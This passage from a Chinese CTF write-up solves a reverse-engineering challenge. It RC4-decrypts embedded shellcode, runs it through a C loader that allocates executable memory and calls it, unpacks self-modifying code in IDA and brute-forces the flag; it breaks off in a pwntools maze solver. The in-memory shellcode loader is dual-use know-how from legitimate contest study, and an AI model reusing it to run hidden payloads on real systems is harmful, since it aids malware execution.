<p>先用密钥初始化RC4的S盒，然后RC4解密shellcode，加载shellcode对输入进行处理</p>
<p>解密shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;9K98jTmDKCXlg9E2kepX4nAi8H0DB57IU57ybV37xjrw2zutw+KnxkoYur3IZzi2ep5tDC6jimCJ7fDpgQ5F3fJu4wHA0LVq9FALbjXN6nMy57KrU8DEloh+Cji3ED3eEl5YWAyb8ktBoyoOkL1c9ASWUPBniHmD7RSqWcNkykt/USjhft9+aV930Jl5VjD6qcXyZTfjnY5MH3u22O9NBEXLj3Y9N5VjEgF2cFJ+Tq7jj92iIlEkNvx8Jl+eH5/hipsonKLTnoLGXs4a0tTQX/uXQOTMBbtd70x04w1Pa0fp+vA9tCw+DXvXj0xmX8c5HMybhpPrwQYDonx7xtS+vRIj/OmU7GxkHOOqYdsGmGdTjTAUEBvZtinOxuR7mZ0r9k+c9da0W93TWm5+2LKNR6OJjmILaJn0lq4foYcfD5+JITDsOD6Vg01yLRG1B4A6OxJ7Rr/DBUabSu2fYf1c4sTFvWgfMV8il6QfJiNMGkVLey1cBPSobenMo+TQC1Ql0//9M4P01sOiwuuVKLvTyDEv6dKO//muVL9S2gq/aZUBWkjj/I5rUJ6Mlt4+jsngmuke9plAjw22fUgz+8uSzn40dhKXfBX/BOCnlwWsMGAefAfoz/XAsoVSG2ioLFmlcYe/WBgaUJEoRUSyv73yiEOTVwIK6EPnDlwRgZZHx2toLu8udpEZ0aKGkex5sn7P8Jf9AbD4/EiQU+FdoJSxGorPSZGvrc4=&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">arr = base64.b64decode(cipher)    </span><br><span class="line"></span><br><span class="line">key = hashlib.md5(<span class="string">&#x27;云南&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>(key.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line">p = cipher.decrypt(<span class="built_in">bytes</span>(arr))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(p))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后用函数指针加载shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">	<span class="number">81</span>, <span class="number">232</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">72</span>, <span class="number">129</span>, <span class="number">193</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">229</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">236</span>, <span class="number">104</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">77</span>, <span class="number">152</span>, <span class="number">199</span>, <span class="number">69</span>, <span class="number">252</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">233</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">252</span>, <span class="number">193</span>, <span class="number">224</span>, <span class="number">4</span>, <span class="number">72</span>, <span class="number">152</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">85</span>, <span class="number">152</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">208</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">240</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">219</span>, <span class="number">186</span>, <span class="number">51</span>, <span class="number">35</span>, <span class="number">1</span>, <span class="number">219</span>, <span class="number">186</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">160</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">255</span>, <span class="number">238</span>, <span class="number">221</span>, <span class="number">204</span>, <span class="number">187</span>, <span class="number">170</span>, <span class="number">153</span>, <span class="number">136</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">205</span>, <span class="number">171</span>, <span class="number">144</span>, <span class="number">120</span>, <span class="number">86</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">176</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">186</span>, <span class="number">220</span>, <span class="number">254</span>, <span class="number">33</span>, <span class="number">67</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">9</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">184</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">240</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">232</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">240</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">8</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">224</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">192</span>, <span class="number">187</span>, <span class="number">111</span>, <span class="number">171</span>, <span class="number">119</span>, <span class="number">3</span>, <span class="number">124</span>, <span class="number">235</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">216</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">190</span>, <span class="number">173</span>, <span class="number">222</span>, <span class="number">13</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">11</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">208</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">69</span>, <span class="number">200</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">235</span>, <span class="number">127</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">232</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">224</span>, <span class="number">8</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">194</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">176</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">194</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">77</span>, <span class="number">232</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">216</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">200</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">194</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">232</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">232</span>, <span class="number">10</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">193</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">184</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">200</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">208</span>, <span class="number">72</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">224</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">224</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">224</span>, <span class="number">8</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">194</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">160</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">194</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">77</span>, <span class="number">216</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">224</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">200</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">194</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">224</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">232</span>, <span class="number">10</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">193</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">200</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">208</span>, <span class="number">72</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">232</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">208</span>, <span class="number">72</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">216</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">69</span>, <span class="number">200</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">125</span>, <span class="number">200</span>, <span class="number">63</span>, <span class="number">15</span>, <span class="number">134</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">240</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">85</span>, <span class="number">232</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">240</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">16</span>, <span class="number">144</span>, <span class="number">131</span>, <span class="number">69</span>, <span class="number">252</span>, <span class="number">1</span>, <span class="number">131</span>, <span class="number">125</span>, <span class="number">252</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">142</span>, <span class="number">197</span>, <span class="number">254</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">196</span>, <span class="number">104</span>, <span class="number">93</span>, <span class="number">89</span>, <span class="number">19</span>, <span class="number">45</span>, <span class="number">239</span>, <span class="number">197</span>, <span class="number">133</span>, <span class="number">72</span>, <span class="number">183</span>, <span class="number">185</span>, <span class="number">107</span>, <span class="number">151</span>, <span class="number">30</span>, <span class="number">51</span>, <span class="number">174</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">61</span>, <span class="number">1</span>, <span class="number">135</span>, <span class="number">228</span>, <span class="number">208</span>, <span class="number">161</span>, <span class="number">110</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">91</span>, <span class="number">206</span>, <span class="number">249</span>, <span class="number">238</span>, <span class="number">144</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">174</span>, <span class="number">91</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">214</span>, <span class="number">131</span>, <span class="number">243</span>, <span class="number">10</span>, <span class="number">63</span>, <span class="number">162</span>, <span class="number">60</span>, <span class="number">255</span>, <span class="number">167</span>, <span class="number">103</span>, <span class="number">240</span>, <span class="number">110</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">131</span>, <span class="number">222</span>, <span class="number">224</span>, <span class="number">175</span>, <span class="number">5</span>, <span class="number">27</span>, <span class="number">91</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">55</span>, <span class="number">133</span>, <span class="number">233</span>, <span class="number">252</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">245</span>, <span class="number">231</span>, <span class="number">61</span>, <span class="number">59</span>, <span class="number">227</span>, <span class="number">129</span>, <span class="number">22</span>, <span class="number">225</span>, <span class="number">192</span>, <span class="number">43</span>, <span class="number">104</span>, <span class="number">237</span>, <span class="number">12</span>, <span class="number">203</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">59</span>, <span class="number">150</span>, <span class="number">195</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">233</span>, <span class="number">200</span>, <span class="number">247</span>, <span class="number">163</span>, <span class="number">104</span>, <span class="number">183</span>, <span class="number">40</span>, <span class="number">98</span>, <span class="number">202</span>, <span class="number">104</span>, <span class="number">230</span>, <span class="number">204</span>, <span class="number">147</span>, <span class="number">157</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">119</span>, <span class="number">147</span>, <span class="number">46</span>, <span class="number">155</span>, <span class="number">235</span>, <span class="number">94</span>, <span class="number">213</span>, <span class="number">116</span>, <span class="number">152</span>, <span class="number">199</span>, <span class="number">174</span>, <span class="number">139</span>, <span class="number">97</span>, <span class="number">102</span>, <span class="number">248</span>, <span class="number">253</span>, <span class="number">19</span>, <span class="number">93</span>, <span class="number">75</span>, <span class="number">41</span>, <span class="number">40</span>, <span class="number">251</span>, <span class="number">201</span>, <span class="number">193</span>, <span class="number">54</span>, <span class="number">64</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">125</span>, <span class="number">35</span>, <span class="number">174</span>, <span class="number">155</span>, <span class="number">130</span>, <span class="number">10</span>, <span class="number">139</span>, <span class="number">197</span>, <span class="number">132</span>, <span class="number">41</span>, <span class="number">205</span>, <span class="number">74</span>, <span class="number">219</span>, <span class="number">102</span>, <span class="number">67</span>, <span class="number">16</span>, <span class="number">221</span>, <span class="number">44</span>, <span class="number">3</span>, <span class="number">204</span>, <span class="number">94</span>, <span class="number">136</span>, <span class="number">122</span>, <span class="number">119</span>, <span class="number">231</span>, <span class="number">48</span>, <span class="number">112</span>, <span class="number">43</span>, <span class="number">57</span>, <span class="number">105</span>, <span class="number">91</span>, <span class="number">184</span>, <span class="number">10</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">73</span>, <span class="number">52</span>, <span class="number">164</span>, <span class="number">22</span>, <span class="number">59</span>, <span class="number">254</span>, <span class="number">165</span>, <span class="number">105</span>, <span class="number">223</span>, <span class="number">237</span>, <span class="number">58</span>, <span class="number">180</span>, <span class="number">94</span>, <span class="number">129</span>, <span class="number">143</span>, <span class="number">114</span>, <span class="number">73</span>, <span class="number">61</span>, <span class="number">210</span>, <span class="number">121</span>, <span class="number">123</span>, <span class="number">115</span>, <span class="number">85</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	PVOID p = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>(p, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">	((<span class="type">void</span>(__stdcall*)())(p))();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用IDA分析得到的exe</p>
<p>第一段shellcode可以分为两个部分，在0x167之前都是对后面部分的SMC，先动态调试，得到解密后的shellcode之后再复制写入ida</p>
<p><img src="https://renovice-1311449499.cos.ap-chongqing.myqcloud.com/img/image-20230401213737097.png" alt="image-20230401213737097"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ida_bytes.patch_bytes（要写入的地址，bytes.fromhex（“解密后的二进制shellcode”））</span><br></pre></td></tr></table></figure>
<p>可以得到真正的加密函数</p>
<p><img src="https://renovice-1311449499.cos.ap-chongqing.myqcloud.com/img/image-20230401213934268.png" alt="image-20230401213934268"></p>
<p>加密主要是将输入中的两个字符拼接在一起然后加密，直接爆破</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cipher[] = &#123; <span class="number">219</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">92</span>, <span class="number">67</span>, <span class="number">204</span>, <span class="number">144</span>, <span class="number">95</span>, <span class="number">202</span>, <span class="number">46</span>, <span class="number">176</span>, <span class="number">183</span>, <span class="number">109</span>, <span class="number">171</span>, <span class="number">17</span>, <span class="number">155</span>, <span class="number">94</span>, <span class="number">104</span>, <span class="number">144</span>, <span class="number">27</span>, <span class="number">108</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">237</span>, <span class="number">117</span>, <span class="number">80</span>, <span class="number">54</span>, <span class="number">12</span>, <span class="number">48</span>, <span class="number">127</span>, <span class="number">197</span>, <span class="number">69</span>, <span class="number">45</span>, <span class="number">76</span>, <span class="number">176</span>, <span class="number">251</span>, <span class="number">186</span>, <span class="number">246</span>, <span class="number">159</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">20</span>; i++) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> code = cipher[<span class="number">2</span> * i] + (cipher[i * <span class="number">2</span> + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">127</span>; k++) &#123;</span><br><span class="line">				<span class="type">unsigned</span> <span class="type">int</span> v8 = <span class="number">2029</span>;</span><br><span class="line">				<span class="type">unsigned</span> <span class="type">int</span> v9 = (j + (k &lt;&lt; <span class="number">8</span>) % <span class="number">0xD1EF</span>);</span><br><span class="line">				<span class="type">unsigned</span> <span class="type">int</span> v6 = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">while</span> (v8) &#123;</span><br><span class="line">					<span class="keyword">if</span> (v8 &amp; <span class="number">1</span>) &#123;</span><br><span class="line">						v6 = v9 * v6 % <span class="number">0xD1EF</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					v9 = v9 * v9 % <span class="number">0xD1EF</span>;</span><br><span class="line">					v8 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (v6 == code) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>, j, k);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//XCTF&#123;5c7ad71b-6c91-4481-af7a-69726a66aea8&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;172.35.3.80&#x27;</span>,<span class="number">11410</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof</span>():</span><br><span class="line">    s1 = io.recvuntil(<span class="string">b&#x27;[+] Plz tell me XXXX:&#x27;</span>)</span><br><span class="line">    p1 = s1.find(<span class="string">b&#x27;X+&#x27;</span>)</span><br><span class="line">    p2 = s1.find(<span class="string">b&#x27;)&#x27;</span>)</span><br><span class="line">    p3 = s1.find(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line">    s = s1[p1+<span class="number">2</span>:p2]</span><br><span class="line">    h = s1[p3+<span class="number">3</span>:-<span class="number">1</span>]</span><br><span class="line">    h = h.decode()</span><br><span class="line">    <span class="built_in">print</span>(h)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(table, repeat=<span class="number">4</span>):</span><br><span class="line">        d = <span class="string">&#x27;&#x27;</span>.join(i).encode()</span><br><span class="line">        dd = d + s</span><br><span class="line">        <span class="comment">#print(dd)</span></span><br><span class="line">        <span class="keyword">if</span> sha256(dd).hexdigest() <span class="keyword">in</span> h:</span><br><span class="line">            <span class="built_in">print</span>(d)</span><br><span class="line">            io.sendline(d)</span><br><span class="line">            <span class="comment">#io.interactive()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">proof()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;There is your map of maze:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">maze = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">750</span>):</span><br><span class="line">    row = io.recvline()[<span class="number">13</span>:].split()</span><br><span class="line">    row = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> row]</span><br><span class="line">    <span class="comment">#print(row)</span></span><br><span class="line">    <span class="comment">#print(len(row))</span></span><br><span class="line">    maze.append(row)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(maze))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(maze[<span class="number">0</span>]))</span><br><span class="line">arr = maze</span><br><span class="line"></span><br><span class="line">brr = [[<span class="number">0</span>] * <span class="number">750</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">750</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">750</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">750</span>):</span><br><span class="line">        brr[i][j] = arr[i][j]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">750</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">750</span>):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">            arr[i][j] += <span class="built_in">max</span>(arr[i- <span class="number">1</span>][j], arr[i-<span class="number">1</span>][j+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">elif</span> j == <span class="number">749</span>:</span><br><span class="line">            arr[i][j] += <span class="built_in">max</span>(arr[i-<span class="number">1</span>][j], arr[i- <span class="number">1</span>][j-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            arr[i][j] += <span class="built_in">max</span>(arr[i-<span class="number">1</span>][j - <span class="number">1</span>], <span class="built_in">max</span>(arr[i-<span class="number">1</span>][j], arr[i-<span class="number">1</span>][j+<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(arr[<span class="number">749</span>]))</span><br><span class="line"></span><br><span class="line">crr = []</span><br><span class="line">idx = arr[<span class="number">749</span>].index(<span class="built_in">max</span>(arr[<span class="number">749</span>]))</span><br><span class="line">crr.append(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">has_duplicates</span>(<span class="params">lst</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(lst) != <span class="built_in">len</span>(<span class="built_in">set</span>(lst))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">748</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> arr[i][idx] &gt; arr[i][idx+<span class="number">1</span>]:</span><br><span class="line">            idx = idx</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = idx + <span class="number">1</span></span><br><span class="line">        crr.append(idx)</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">749</span>:</span><br><span class="line">        <span class="keyword">if</span> arr[i][idx] &gt; arr[i][idx-<span 